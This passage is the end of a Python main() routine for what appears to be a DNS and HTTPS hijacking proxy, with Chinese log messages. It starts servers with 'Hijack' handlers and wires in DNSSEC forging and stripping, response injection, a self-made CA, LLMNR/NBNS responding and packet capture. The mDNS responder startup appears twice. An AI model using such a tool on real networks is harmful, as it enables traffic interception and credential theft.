s.strip()],'dnssec_forge':args.dnssec_forge,'dnssec_strip':args.dnssec_strip,'aaaa_priority':args.aaaa_priority,'ipv6_only':args.ipv6_only,'geoip_db':args.geoip_db,'geo_allow_cidrs':args.geo_allow,'geo_deny_cidrs':args.geo_deny,'webhook_url':args.webhook_url,'webhook_min_severity':args.webhook_min_severity,'playbook':args.playbook,'doq_enabled':args.doq})
        STATE['rules']=parse_rules(args.rules_file,args.rule,target_ip)
    if args.profile:
        try: profile_load(args.profile); log.info(f"加载profile {args.profile}")
        except Exception as e: log.warning(f"profile load: {e}")
    if args.config:
        reload_config(args.config)
    if args.tee:
        with STATE['lock']: STATE['upstream_tee']=[s.strip() for s in args.tee.split(',') if s.strip()]
    if args.response_inject and os.path.exists(args.response_inject):
        try:
            with open(args.response_inject,'r',encoding='utf-8') as f: inj=json.load(f)
            with STATE['lock']: STATE['response_inject']=inj
        except Exception as e: log.warning(f'response_inject load: {e}')
    ca_ready=ensure_ca() if (not args.no_https or not args.no_dot) else False
    servers=[]
    if not args.no_dns:
        try: s=DNSServer((args.bind,dns_port),DNSHandler); servers.append(s); threading.Thread(target=s.serve_forever,daemon=True).start(); log.info(f"DNS {args.bind}:{dns_port}")
        except Exception as e: log.error(f"DNS: {e}")
    if not args.no_http:
        try: s=ThreadingHTTPServer((args.bind,http_port),HijackHTTPHandler); s.target_ip=target_ip; s.is_https=False; s.enable_doh=True; s.mirror_upstream=args.mirror_upstream; servers.append(s); threading.Thread(target=s.serve_forever,daemon=True).start(); log.info(f"HTTP {args.bind}:{http_port} (+DoH)")
        except Exception as e: log.error(f"HTTP: {e}")
    if not args.no_https and ca_ready:
        try: s=SNIHijackHTTPServer((args.bind,https_port),HijackHTTPHandler,target_ip,ca_ready); s.mirror_upstream=args.mirror_upstream; servers.append(s); threading.Thread(target=s.serve_forever,daemon=True).start(); log.info(f"HTTPS {args.bind}:{https_port} (SNI+DoH)")
        except Exception as e: log.error(f"HTTPS: {e}")
    if not args.no_dot and ca_ready:
        try:
            dc,dk=make_host_cert('dot.local')
            if dc:
                ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(dc,dk); s=DoTServer((args.bind,dot_port),DoTHandler); s.tls_ctx=ctx; servers.append(s); threading.Thread(target=s.serve_forever,daemon=True).start(); log.info(f"DoT {args.bind}:{dot_port}")
        except Exception as e: log.error(f"DoT: {e}")
    if not args.no_admin:
        try: s=ThreadingHTTPServer((args.bind,admin_port),AdminHandler); servers.append(s); threading.Thread(target=s.serve_forever,daemon=True).start(); log.info(f"ADMIN http://{args.bind}:{admin_port}/")
        except Exception as e: log.error(f"ADMIN: {e}")
    servers += start_tcp_relays(args.relay,args.bind)
    if args.mdns:
        threading.Thread(target=mdns_responder, args=(target_ip,), daemon=True).start(); log.info('mDNS/LLMNR/NBNS responder started')
    if args.mdns:
        threading.Thread(target=mdns_responder, args=(target_ip,), daemon=True).start(); log.info('mDNS/LLMNR/NBNS responder started')
    if STATE.get('dns_over_tcp', True) and not args.no_dns_tcp:
        threading.Thread(target=dns_over_tcp_listen, args=(args.bind, dns_port), daemon=True).start(); log.info('DNS-over-TCP ' + args.bind + ':' + str(dns_port))
    if STATE.get('ws_push_enabled', True):
        threading.Thread(target=ws_listener, args=(args.bind, 9090), daemon=True).start(); log.info('WS push listener :9090')
    if args.auto_health_check:
        def _hc():
            while True:
                try: upstream_health_refresh()
                except Exception: pass
                time.sleep(STATE['upstream_check_interval'])
        threading.Thread(target=_hc, daemon=True).start(); log.info('upstream health check started')
    if args.doq and HAS_QUIC:
        dc,dk = make_host_cert('doq.local')
        if dc:
            ok,msg = doq_start(dc,dk,None, dot_port)
            log.info(f'DoQ: {ok} {msg}')
    if args.cache_prewarm:
        threading.Thread(target=cache_prewarm, daemon=True).start()
    if args.pcap_iface: log.info(f"PCAP: {pcap_start(args.pcap_iface, os.path.join(BASE_DIR,args.pcap_file), args.pcap_bpf)}")
    if args.config:
        def _watch():
            last=0
            while True:
                try:
                    mt=os.path.getmtime(args.config) if os.path.exists(args.config) else 0
                    if mt and mt!=last:
                        if last!=0: reload_config(args.config)
                        last=mt
                except Exception: pass
                time.sleep(2)
        threading.Thread(target=_watch,daemon=True).start()
    if not servers: log.error('无服务'); raise SystemExit(1)
    ca_info_collect()
    log.info(f"运行中 DNS={dns_port} HTTP={http_port} HTTPS={https_port} DoT={dot_port} ADMIN={admin_port} upstream={STATE['upstream_mode']}")
    def shutdown(sig,frame): log.info('停止'); pcap_stop(); [getattr(s,'shutdown',lambda:None)() for s in servers]; raise SystemExit(0)
    signal.signal(signal.SIGINT,shutdown); signal.signal(signal.SIGTERM,shutdown)
    while True: time.sleep(1)

if __name__=='__main__': main()
